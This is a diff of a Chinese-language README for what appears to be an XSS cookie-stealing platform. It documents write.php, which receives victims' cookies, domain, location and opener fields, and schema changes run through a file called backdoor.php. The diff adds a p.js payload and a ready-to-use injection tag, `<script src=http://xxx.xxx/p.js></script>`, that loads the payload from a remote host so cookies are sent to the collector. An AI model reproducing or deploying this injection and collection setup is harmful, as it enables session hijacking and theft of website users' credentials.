@@ -7,8 +7,9 @@
 ##使用方法
 配置config.php，填写数据库用户名、密码等信息。
 install.php：创建数据库、表等操作
-write.php：GET或者POST得到的Cookie。例如：write.php?domain=FOO&url=BAR&cookie=ABC%3dabc
-数据库需要提交的字段为：domain（长度小于50）、url、cookie
+write.php：GET或者POST得到的Cookie。
+需要提交的参数为domain location toplocation cookie opener。
+含有payload：p.js
 
 ##附加功能
 读、写密码
@@ -41,3 +42,15 @@ CSS文件已改为PHP文件读写。
 分离出CSS文件，并移动到style/main.css
 增加read.php条件查询
 
+###2015-10-20 15:45:32
+修改数据库，更改url字段名为location并允许NULL，增加toplocation（用于框架）、opener。
+从旧的数据库变更请在backdoor.php执行SQL命令：
+···
+alter table info change url location longtext NULL
+alter table info add toplocation longtext
+alter table info modify column cookie longtext after toplocation
+alter table info add opener longtext
+describe info
+···
+增加p.js作为payload，修改内部write.php域名和路径即可使用。
+`<script src=http://xxx.xxx/p.js></script>`
